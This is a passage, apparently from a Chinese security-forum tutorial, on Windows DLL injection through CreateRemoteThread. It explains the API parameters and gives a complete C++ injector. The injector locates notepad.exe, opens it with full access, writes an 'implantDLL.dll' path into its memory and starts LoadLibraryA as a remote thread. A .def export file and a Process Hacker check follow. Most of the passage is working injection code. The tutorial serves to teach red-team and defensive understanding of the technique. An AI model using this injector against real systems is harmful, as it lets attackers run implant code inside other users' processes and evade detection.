Win32Api提供了`CreateRemoteThread()`用于创建远程线程，即控制其它进程来创建运行一个新线程[CreateRemoteThread | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

> 与CreateThread函数区别在于，CreateRemoteThread函数是针对另一个进程创建线程

```cpp
HANDLE CreateRemoteThread(
    HANDLE                 hProcess,        
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,     
    LPTHREAD_START_ROUTINE lpStartAddress,  
    LPVOID                 lpParameter,     
    DWORD                  dwCreationFlags, 
    LPDWORD                lpThreadId       
);
```

- hProcess指定目标进程句柄
- lpThreadAttributes设置线程属性，通常设为NULL
- dwStackSize指定线程栈初始大小，0表示默认大小1MB
- lpStartAddress指定待执行的函数
- lpParameter指定传送给线程的变量
- dwCreationFlags表示线程创建标志，通常设为0
- lpThreadId返回线程ID，一般设置为NULL

本例调用：

```cpp
CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
```

第四个参数的类型是函数指针类型，可以用**LPTHREAD\_START\_ROUTINE**表示，也可以**typedef**自定义函数指针

这里我们需要先获取载入函数的地址pLoadLibrary，[LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) 函数用于加载模块至进程地址空间中，使用`GetProcAddress()`函数获取地址，明确指出是`PTHREAD_START_ROUTINE`函数指针类型

```cpp
pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
```

### 4 完整代码

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int FindTarget(const char *procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;     
        pe32.dwSize = sizeof(PROCESSENTRY32);      
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }  
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }     
        CloseHandle(hProcSnap);     
        return pid;
}

int main(int argc, char *argv[]) {

    HANDLE pHandle;
    PVOID remBuf;
    PTHREAD_START_ROUTINE pLoadLibrary = NULL;
    char dll[] = "C:\Users\rto\Desktop\src\07.Code_Injection\02.DLL\implantDLL.dll";
    char target[] = "notepad.exe";
    int pid = 0;

    pid = FindTarget(target);
    if ( pid == 0) {
        printf("Target NOT FOUND! Exiting.\n");
        return -1;
    }
    printf("Target PID: [ %d ]\nInjecting...", pid);

    pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));
    if (pHandle != NULL) {
        remBuf = VirtualAllocEx(pHandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE); 
        WriteProcessMemory(pHandle, remBuf, (LPVOID) dll, sizeof(dll), NULL);
        CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);
        printf("done!\nremBuf addr = %p\n", remBuf);
        CloseHandle(pHandle); 
    }
    else {
        printf("OpenProcess failed! Exiting.\n");
        return -2;
    }
}
```

此外，还有个`.def`文件，在其中描述dll导出函数，用于编译链接过程中

```php
LIBRARY "ImplantDLL"
EXPORTS
  Go
```

编译执行及分析
-------

运行后，在process hacker工具中，查看到dll信息

![Luda40.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c27e9f177e4482510a4f41ca87c0aea2ea69394c.png)